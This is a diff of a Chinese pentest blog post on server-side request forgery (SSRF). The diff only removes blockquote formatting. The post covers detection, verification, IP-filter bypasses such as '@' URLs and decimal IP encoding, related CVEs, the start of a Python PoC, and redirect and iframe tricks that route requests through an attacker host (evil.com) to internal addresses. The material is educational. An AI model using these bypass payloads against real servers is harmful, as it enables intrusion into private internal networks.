@@ -9,15 +9,15 @@ topics = ["Pentest"]
 +++
 
 ### 0x00 什么是SSRF
-> &nbsp;&nbsp;&nbsp;&nbsp;SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，<font color="FF0000">它将一个可以发起网络请求的服务当作跳板来攻击其他服务</font>，SSRF的攻击目标一般是<font color="FF0000">内网</font>。  
-&nbsp;&nbsp;&nbsp;&nbsp;当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
+SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，<font color="FF0000">它将一个可以发起网络请求的服务当作跳板来攻击其他服务</font>，SSRF的攻击目标一般是<font color="FF0000">内网</font>。  
+当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
 
 ### 0x01 SSRF的危害
-> 可以扫描内部网络  
+可以扫描内部网络  
 可以构造数据攻击内部主机
 
 ### 0x02 漏洞挖掘
-> 其实只要能对外发起网络请求就有可能存在SSRF漏洞。
+其实只要能对外发起网络请求就有可能存在SSRF漏洞。
 ```
 1. 从WEB功能上寻找
     通过URL分享内容
@@ -32,7 +32,7 @@ topics = ["Pentest"]
 ```
 
 ### 0x03 漏洞验证
-> ```
+```
 http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png，
     说明不存在SSRF漏洞。  
@@ -41,7 +41,7 @@ http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
 ```
 
 ### 0x04 绕过过滤
-> 有时漏洞利用时会遇到IP限制，可用如下方法绕过：
+有时漏洞利用时会遇到IP限制，可用如下方法绕过：
 ```
 * 使用@：http://A.com@10.10.10.10 = 10.10.10.10
 * IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
@@ -61,7 +61,7 @@ http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
 * CVE-2016-3718 - ImageMagick
 
 ### 0x06 附实例POC
-> ```python
+```python
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
@@ -113,7 +113,7 @@ ssrf无回显用dnslog，有回显就加载第三方内容，宝哥说的姿势�
 
 * 302跳转
 
-> ```php
+```php
 //在自己服务器上建立文件，利用302跳转到对方内网地址。
 //http://target.com/httpProxyAccess.htm?go=http://evil.com/a.php?url=http://10.11.213.57
 //a.php内容如下：
@@ -125,7 +125,7 @@ ssrf无回显用dnslog，有回显就加载第三方内容，宝哥说的姿势�
 
 * iframe
 
-> ```php
+```php
 //在自己服务器建立文件，利用iframe标签请求对方内网地址。
 //参考http://www.secpulse.com/archives/50034.html
 <iframe src="对方内网地址">
